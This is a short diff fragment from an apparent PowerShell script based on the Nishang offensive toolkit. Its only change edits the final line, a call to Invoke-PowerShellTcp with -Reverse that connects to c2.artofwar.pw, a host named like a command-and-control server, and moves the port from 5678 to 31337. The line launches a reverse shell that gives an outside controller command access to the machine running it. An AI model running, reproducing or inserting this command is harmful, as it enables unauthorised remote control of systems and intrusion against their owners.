@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress c2.artofwar.pw -Port 5678
+Invoke-PowerShellTcp -Reverse -IPAddress c2.artofwar.pw -Port 31337
